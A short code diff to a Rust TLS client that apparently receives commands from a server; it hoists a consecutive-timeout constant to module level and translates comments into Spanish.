@@ -38,6 +38,11 @@ use rustls::ClientConfig;
 
 const DELIMITER: &str = "\n<<END>>\n";
 
+/// Máximo de timeouts consecutivos antes de forzar reconexión.
+/// Sirve para detectar conexiones muertas cuando el servidor se cierra.
+/// 3 timeouts x 5 min = 15 min máximo antes de reconectar.
+const MAX_CONSECUTIVE_TIMEOUTS: u32 = 3;
+
 /// Configura TCP keepalive para prevenir que la conexión se cierre por inactividad.
 /// Esto es crítico para mantener sesiones estables a través de NAT/firewalls.
 fn configure_tcp_keepalive(stream: &TcpStream) -> std::io::Result<()> {
@@ -231,7 +236,6 @@ fn handle_tls_connection(tcp_stream: TcpStream, tls_conn: rustls::ClientConnecti
     // sin detectar que la conexión está muerta. Después de MAX_CONSECUTIVE_TIMEOUTS
     // timeouts sin recibir datos, asumimos que la conexión está muerta y reconectamos.
     let mut consecutive_timeouts: u32 = 0;
-    const MAX_CONSECUTIVE_TIMEOUTS: u32 = 3; // 3 timeouts x 5 min = 15 min máximo antes de reconectar
     
     loop {
         // Leer datos del stream TLS
@@ -241,7 +245,7 @@ fn handle_tls_connection(tcp_stream: TcpStream, tls_conn: rustls::ClientConnecti
                 break;
             }
             Ok(n) => {
-                // Reset timeout counter on successful read
+                // Resetear contador de timeouts al recibir datos exitosamente
                 consecutive_timeouts = 0;
                 
                 let data = String::from_utf8_lossy(&read_buffer[..n]);
@@ -398,14 +402,13 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
 
     // Contador de timeouts consecutivos para detectar conexiones muertas
     let mut consecutive_timeouts: u32 = 0;
-    const MAX_CONSECUTIVE_TIMEOUTS: u32 = 3;
 
     let mut buffer = String::new();
     loop {
         match reader.read_line(&mut buffer) {
             Ok(0) => break,
             Ok(_) => {
-                // Reset timeout counter on successful read
+                // Resetear contador de timeouts al recibir datos exitosamente
                 consecutive_timeouts = 0;
                 
                 let command = buffer.trim();
